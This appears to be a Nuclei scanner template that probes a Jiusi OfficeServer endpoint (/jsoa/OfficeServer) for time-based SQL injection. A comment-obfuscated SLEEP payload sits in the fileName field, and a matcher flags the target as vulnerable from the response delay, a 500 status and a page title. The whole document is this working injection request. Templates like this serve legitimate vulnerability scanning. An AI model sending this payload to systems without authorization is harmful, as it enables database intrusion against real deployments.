id: jiusi-OfficeServer-sqli

info:
  name: jiusi-OfficeServer-sqli
  author: YY
  severity: high


http:
  - raw:
      - |
        POST /jsoa/OfficeServer HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)

        isAjaxDownloadTemplate=true&fileName='/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(3)))T)/**/AND/**/'1'='1


    matchers:
      - type: dsl
        condition: and
        dsl:
          - duration > 3 && status_code==500 && contains_all(body,'Untitled Document')